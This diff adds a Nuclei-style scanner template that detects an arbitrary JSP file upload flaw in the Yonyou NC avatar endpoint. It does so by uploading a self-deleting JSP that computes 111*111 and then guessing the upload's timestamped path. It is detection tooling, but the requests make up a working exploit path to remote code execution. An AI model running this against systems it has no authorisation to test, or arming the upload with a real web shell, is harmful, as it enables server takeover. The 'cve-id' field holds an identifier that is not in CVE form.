@@ -1,0 +1,85 @@
+id: yonyou-nc-avatar-fileupload
+
+info:
+  name: 用友NC-avatar接口存在文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    用友 NC avatar接口处存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://blog.csdn.net/qq_36618918/article/details/137913219
+  remediation: |
+    补官方补丁，重启修复
+  classification:
+    cve-id: TVE-2024-05092222
+    cvss-score: 9.0
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-01-06
+    version: 用友NC
+    fofa-query: body="UClient.dmg"
+  tags: yonyou,rce,nc,fileupload
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+  usercode: "{{to_lower(rand_base(4))}}"
+
+flow: |
+  
+  if(http(1)==true){
+      log("存在漏洞开始爆破")
+      var dateObject = new Date(template["uploadtime"]);
+
+      startTime = dateObject.getTime()
+
+      for (var i = 0; i < 1000; i++) {
+
+          var currentTime = startTime + i;
+          set("currentTime",currentTime)
+          if(http(2)===true){
+            break
+          }
+      }
+  }
+  
+http:
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode={{usercode}}&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        Accept-Encoding: gzip
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="uploadedfile"; filename="{{filename}}.jsp"
+
+        <%out.print(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}--
+
+
+    extractors:
+      - type: kval
+        part: header
+        internal: true
+        name: uploadtime
+        kval:
+          - Date
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'true')"
+
+  - raw:
+      - |
+        GET /uapim/static/pages/photo/{{usercode}}/{{usercode}}.{{currentTime}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '12321')"
